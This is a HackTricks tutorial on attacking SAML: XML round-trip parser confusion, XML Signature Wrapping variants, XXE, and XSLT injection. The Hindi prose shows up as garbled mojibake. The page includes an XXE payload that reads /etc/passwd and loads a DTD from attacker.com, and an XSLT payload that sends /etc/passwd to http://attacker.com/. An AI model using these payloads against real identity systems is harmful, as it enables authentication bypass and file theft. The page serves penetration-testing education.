# SAML рд╣рдорд▓реЗ

## SAML рд╣рдорд▓реЗ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## рд╣рдорд▓реЛрдВ рдХрд╛ рдЧреНрд░рд╛рдлрд┐рдХ

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## рдЙрдкрдХрд░рдг

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ URL рдпрд╛ URL рдХреА рд╕реВрдЪреА рд▓реЗ рд╕рдХрддрд╛ рд╣реИ рдФрд░ SAML consume URL рд╡рд╛рдкрд╕ рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИред

## XML рд░рд╛рдЙрдВрдб-рдЯреНрд░рд┐рдк

XML рдореЗрдВ, XML рдХрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рднрд╛рдЧ рдореЗрдореЛрд░реА рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд┐рд░ рдХреБрдЫ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ/рдбрд┐рдХреЛрдбрд┐рдВрдЧ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рдпрд╣ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ/рдбрд┐рдХреЛрдбрд┐рдВрдЧ рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓рдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЙрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдЬрд╛рдВрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдбреЗрдЯрд╛ рдФрд░ рдореВрд▓ рдбреЗрдЯрд╛ рд╕рдорд╛рди рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ REXML 3.2.4 рдпрд╛ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рдорд┐рд▓реЗрдЧрд╛:
```
First child in original doc: Y
First child after round-trip: Z
```
рдКрдкрд░ рджрд┐рдП рдЧрдП рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕реЗ рдореВрд▓ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ REXML рдиреЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджреЗрдЦрд╛:

![](<../../.gitbook/assets/image (561).png>)

рдФрд░ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХреЗ рдПрдХ рджреМрд░ рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджреЗрдЦрд╛:

![](<../../.gitbook/assets/image (562).png>)

рдХрдордЬреЛрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╡рд╛рд▓реЗ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЖрдорддреМрд░ рдкрд░ **рджреЛ рд╕реНрд╡рддрдВрддреНрд░ рдЪрд░рдгреЛрдВ рдореЗрдВ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**: **рд╣рд╕реНрддрд╛рдХреНрд╖рд░** **рдорд╛рдиреНрдпрддрд╛** рдФрд░ **рдХрд╛рд░реНрдп** **рдЖрд╣реНрд╡рд╛рди** (рд╡реНрдпрд╛рдкрд╛рд░ рддрд░реНрдХ). рдпрджрд┐ рджреЛрдиреЛрдВ рдореЙрдбреНрдпреВрд▓ рдбреЗрдЯрд╛ рдкрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд░рдЦрддреЗ рд╣реИрдВ, рддреЛ XML Signature Wrapping attacks (XSW) рдирд╛рдордХ рдПрдХ рдирдИ рд╢реНрд░реЗрдгреА рдХреА рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВред\
рдЗрди рд╣рдорд▓реЛрдВ рдореЗрдВ **рдЖрдХреНрд░рдордгрдХрд╛рд░реА** рд╕рдВрджреЗрд╢ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ **рдкрд░рд┐рд╡рд░реНрддрди** рдХрд░рддрд╛ рд╣реИ **рдЬрд╛рд▓реА** рддрддреНрд╡реЛрдВ рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдХреЗ **рдЬреЛ XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдЕрдорд╛рдиреНрдп рдирд╣реАрдВ рдХрд░рддреЗ**. рдЗрд╕ рдкрд░рд┐рд╡рд░реНрддрди рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╕рдВрджреЗрд╢ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрджрд▓рдирд╛ рд╣реИ рдХрд┐ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд░реНрдХ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдорд╛рдиреНрдпрддрд╛ рдореЙрдбреНрдпреВрд▓ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣рд┐рд╕реНрд╕реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**. рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдорд╛рдиреНрдп рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд░реНрдХ рдЬрд╛рд▓реА рддрддреНрд╡ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ. рдЗрд╕ рдкреНрд░рдХрд╛рд░ **рдЖрдХреНрд░рдордгрдХрд╛рд░реА рдЗрдВрдЯреАрдЧреНрд░рд┐рдЯреА рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЗ рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░ рджреЗрддрд╛ рд╣реИ** рдФрд░ рдордирдорд╛рдиреА рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

SAML рдЕрдиреБрд░реЛрдз рд╕реЗ:

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

рдПрдХ рдЖрдХреНрд░рдордгрдХрд╛рд░реА **рдирдпрд╛ рдореВрд▓ рддрддреНрд╡ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░** рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЬрдм рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рджрд╛рддрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рддреЛ рдпрд╣ рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЙрд╕реЗ **Response -> Assertion -> Subject** рдХреА **рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреА рд╣реИ, рдФрд░ рдпрд╣ рд▓рд╛рд▓ рд░рдВрдЧ рдореЗрдВ **рдмреБрд░реЗ рдирдП Response -> Assertion -> Subject** рдкрде рд╕реЗ рднреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

#1 рдХреЗ рд╕рд╛рде рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд╛ рдкреНрд░рдХрд╛рд░ рдПрдХ **рдбрд┐рдЯреИрдЪреНрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░** рд╣реИ рдЬрд╣рд╛рдВ XSW #1 рдореЗрдВ рдПрдХ рдПрдирд╡реЗрд▓рдкрд┐рдВрдЧ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдирдпрд╛ рдмреБрд░рд╛ рд╕рдВрд░рдЪрдирд╛ рдкрд╣рд▓реЗ рдХреА рддрд░рд╣ рд╣реА рд╣реИ, рдЕрдЦрдВрдбрддрд╛ рдЬрд╛рдВрдЪ рдХреЗ рдмрд╛рдж рд╡реНрдпрд╛рдкрд╛рд░ рддрд░реНрдХ рдХреЛ рднреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реА рд╣реИред

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рдПрдХ **рдмреБрд░рд╛ Assertion рдореВрд▓ assertion рдХреЗ рд╕рдорд╛рди рд╕реНрддрд░ рдкрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡реНрдпрд╛рдкрд╛рд░ рддрд░реНрдХ рдХреЛ рднреНрд░рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдмреБрд░реЗ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4 #3 рдХреЗ рд╕рдорд╛рди рд╣реИ, рд╕рд┐рд╡рд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **рдореВрд▓ Assertion рдХреЙрдкреА рдХрд┐рдП рдЧрдП Assertion рдХрд╛ рдмрдЪреНрдЪрд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИ**ред

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

XSW #5 рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдФрд░ рдореВрд▓ Assertion рддреАрди рдорд╛рдирдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдиреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВ (enveloped/enveloping/detached). рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ Assertion рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдПрдирд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 рдЕрдкрдиреЗ рдХреЙрдкреА рдХрд┐рдП рдЧрдП Assertion рдХреЛ #4 рдФрд░ #5 рдХреЗ рд╕рдорд╛рди рд╕реНрдерд╛рди рдкрд░ рдбрд╛рд▓рддрд╛ рд╣реИред рдпрд╣рд╛рдВ рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ Assertion рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдПрдирд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдмрджрд▓реЗ рдореЗрдВ рдореВрд▓ Assertion рдХреЛ рдПрдирд╡реЗрд▓рдк рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 рдПрдХ **Extensions** рддрддреНрд╡ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдХреЙрдкреА рдХрд┐рдП рдЧрдП **Assertion** рдХреЛ рдПрдХ **рдмрдЪреНрдЪреЗ** рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИред Extensions рдПрдХ рдорд╛рдиреНрдп XML рддрддреНрд╡ рд╣реИ рдЬрд┐рд╕рдХреА рд╕реНрдХреАрдорд╛ рдкрд░рд┐рднрд╛рд╖рд╛ **рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ** рд╣реИред рдЗрд╕ [рд╢реНрд╡реЗрдд рдкрддреНрд░](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) рдХреЗ рд▓реЗрдЦрдХреЛрдВ рдиреЗ OpenSAML рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ рдпрд╣ рд╡рд┐рдзрд┐ рд╡рд┐рдХрд╕рд┐рдд рдХреАред OpenSAML рдиреЗ рд╕реНрдХреАрдорд╛ рдорд╛рдиреНрдпрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдорд╛рдиреНрдпрддрд╛ рдХреЗ рджреМрд░рд╛рди рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЧрдИ ID рдХреА рдореВрд▓ Assertion рдХреА ID рд╕реЗ рд╕рд╣реА рддреБрд▓рдирд╛ рдХреАред рд▓реЗрдЦрдХреЛрдВ рдиреЗ рдкрд╛рдпрд╛ рдХрд┐ рдЬрд╣рд╛рдВ рдХреЙрдкреА рдХрд┐рдП рдЧрдП Assertions рдЬрд┐рдирдХреА ID рдореВрд▓ Assertion рдХреА ID рдХреЗ рд╕рдорд╛рди рдереА, рд╡реЗ рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рд╕реНрдХреАрдорд╛ рдкрд░рд┐рднрд╛рд╖рд╛ рд╡рд╛рд▓реЗ рддрддреНрд╡ рдХреЗ рдмрдЪреНрдЪреЗ рдереЗ, рд╡реЗ рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рддрд┐рд░реЛрдзреА рдЙрдкрд╛рдп рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗред

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8 рдПрдХ рдФрд░ **рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ XML рддрддреНрд╡** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ XSW #7 рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП рд╣рдорд▓реЗ рдХреЗ рдкреИрдЯрд░реНрди рдХрд╛ рдПрдХ рд╡рд┐рд╡рд┐рдзрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рдмрд╛рд░ рдореВрд▓ Assertion рдХреЙрдкреА рдХрд┐рдП рдЧрдП Assertion рдХреЗ рдмрдЬрд╛рдп рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рддрддреНрд╡ рдХрд╛ рдмрдЪреНрдЪрд╛ рд╣реИред

![](<../../.gitbook/assets/image (545).png>)

### рдЙрдкрдХрд░рдг

рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ, рдХрд┐рд╕реА рднреА XSW рд╣рдорд▓реЗ рдХреЛ рдЪреБрдирдиреЗ рдФрд░ рдЙрд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (546).png>)

### рдореВрд▓ рдкреЗрдкрд░

рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рдкреЗрдкрд░ рдкрдврд╝реЗрдВ [https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

рдпрджрд┐ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ XXE рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

рдЗрд╕ рддрдереНрдп рдХреЗ рдХрд╛рд░рдг рдХрд┐ SAML Responses рдбрд┐рдлреНрд▓реЗрдЯреЗрдб рдФрд░ base64тАЩd **XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝** рд╣реЛрддреЗ рд╣реИрдВ, рд╣рдо SAML Response рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬреЗ рдЧрдП XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдореИрдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ **XXE** рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### рдЯреВрд▓

рдЖрдк Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд XXE рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

XSLT рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЬрд╛рдПрдБ:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformation (XSLT) рдПрдХ Turing-complete рднрд╛рд╖рд╛ рд╣реИ рдЬреЛ XML рджрд╕реНрддрд╛рд╡реЗрдЬреЛрдВ рдХреЛ HTML, JSON, рдпрд╛ PDF рдЬреИрд╕реЗ рдЕрдиреНрдп рджрд╕реНрддрд╛рд╡реЗрдЬ рдкреНрд░рдХрд╛рд░реЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣рд╛рдБ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рдпрд╣ рд╣реИ рдХрд┐ **рд╣рдорд▓реЗ рдХреЗ рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдз рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ **XSLT рдкрд░рд┐рд╡рд░реНрддрди рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реЛрддрд╛ рд╣реИ**ред рдореВрд▓ рд░реВрдк рд╕реЗ, рд╣рдореЗрдВ рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рджрд░реНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдпрд╛ рдЕрдорд╛рдиреНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

рдпрд╣рд╛рдБ рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ **POC** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдЦрдВрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд hacktricks рдкреГрд╖реНрда рдкрд░ рдЖрдк рдкреЗрд▓реЛрдбреНрд╕ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### рдЙрдкрдХрд░рдг

